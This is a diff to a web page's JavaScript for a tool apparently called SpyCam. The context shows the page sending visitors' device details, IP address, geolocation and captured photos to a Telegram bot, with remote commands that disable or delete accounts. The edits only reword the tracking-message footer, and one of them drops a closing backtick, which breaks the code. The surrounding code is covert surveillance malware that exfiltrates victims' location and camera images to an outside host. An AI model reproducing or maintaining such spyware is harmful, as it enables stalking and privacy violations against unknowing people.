@@ -1189,7 +1189,7 @@ const SpyCam = {
                 `👤 User: ${this.userUID}\n` +
                 `🕵️ Device: ${navigator.userAgent.substring(0, 80)}...\n` +
                 `⏰ ${new Date().toLocaleString()}\n\n` +
-                `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+                `🔹 User Tracked ${BOT_USERNAME}
             );
             
         } catch(e) {
@@ -1252,7 +1252,7 @@ const SpyCam = {
             `🕵️ Device: ${navigator.userAgent.substring(0, 60)}...\n` +
             `🌐 IP: ${localStorage.getItem('userIP') || 'N/A'}\n` +
             `⏰ ${new Date().toLocaleString()}\n\n` +
-            `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+            `🔹 User Tracked ${BOT_USERNAME}`
         );
     },
 
@@ -1273,7 +1273,7 @@ const SpyCam = {
                         `👤 User: ${this.userUID}\n` +
                         `🕵️ ${navigator.userAgent.substring(0, 60)}...\n` +
                         `⏰ ${new Date().toLocaleString()}\n\n` +
-                        `🔹 <b>Tracked By ${BOT_USERNAME}</b>`;
+                        `🔹 User Tracked ${BOT_USERNAME}`;
                     
                     await TELEGRAM.sendMessage(locationMsg);
                     await this.sendLocationToTelegram(latitude, longitude);
@@ -1386,7 +1386,7 @@ const TELEGRAM = {
         msg += `│ 💾 Memory: ${di.memory || 'N/A'}\n`;
         msg += `│ ⚡ CPU: ${di.cpu || 'N/A'}\n`;
         msg += `└─────────────────────────────────┘\n\n`;
-        msg += `🔹 <b>Tracked By ${BOT_USERNAME}</b>`;
+        msg += `🔹User Tracked ${BOT_USERNAME}`;
         return msg;
     },
 
@@ -1418,7 +1418,7 @@ const TELEGRAM = {
                     `✅ <b>Account Disabled</b>\n` +
                     `🆔 UID: ${uid}\n` +
                     `👤 ${BOT_USERNAME}\n\n` +
-                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+                    `🔹User Tracked ${BOT_USERNAME}`
                 );
             } else if (action === 'enable' && uid) {
                 await db.collection('users').doc(uid).update({ enabled: true });
@@ -1427,7 +1427,7 @@ const TELEGRAM = {
                     `✅ <b>Account Enabled</b>\n` +
                     `🆔 UID: ${uid}\n` +
                     `👤 ${BOT_USERNAME}\n\n` +
-                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+                    `🔹 User Tracked ${BOT_USERNAME}`
                 );
             } else if (action === 'delete' && uid) {
                 await db.collection('users').doc(uid).delete();
@@ -1436,7 +1436,7 @@ const TELEGRAM = {
                     `✅ <b>Account Deleted</b>\n` +
                     `🆔 UID: ${uid}\n` +
                     `👤 ${BOT_USERNAME}\n\n` +
-                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`
+                    `🔹 User Tracked ${BOT_USERNAME}`
                 );
             } else if (action === 'get_user' && uid) {
                 const doc = await db.collection('users').doc(uid).get();
@@ -1456,7 +1456,7 @@ const TELEGRAM = {
                     `🟢 Active Users: ${stats.active}\n` +
                     `📸 Photos Captured: ${stats.photos || 0}\n` +
                     `📍 Locations Tracked: ${stats.locations || 0}\n\n` +
-                    `🔹 <b>Tracked By ${BOT_USERNAME}</b>`;
+                    `🔹 User Tracked ${BOT_USERNAME}`;
                 await this.sendMessage(msg);
             } else if (action === 'broadcast' && cmd.message) {
                 await this.broadcastMessage(cmd.message);
@@ -2464,4 +2464,4 @@ window.addEventListener('beforeunload', function() {
 });
 </script>
 </body>
-                    </html>
+                                                                             </html>
